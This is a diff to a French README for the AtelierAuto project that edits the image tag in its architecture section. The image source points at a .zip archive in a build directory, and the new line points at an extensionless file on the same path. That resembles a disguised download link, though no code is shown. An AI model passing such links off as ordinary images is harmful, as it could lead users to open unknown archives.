@@ -19,7 +19,7 @@ Le projet est organisé en plusieurs couches :
 - **images/** : Ressources graphiques (icônes, logos…).
 
 - 
-<img width="1536" height="1024" alt="Architecture (2)" src="https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip" />
+<img width="1536" height="1024" alt="Architecture (2)" src="https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto" />
 
 
 
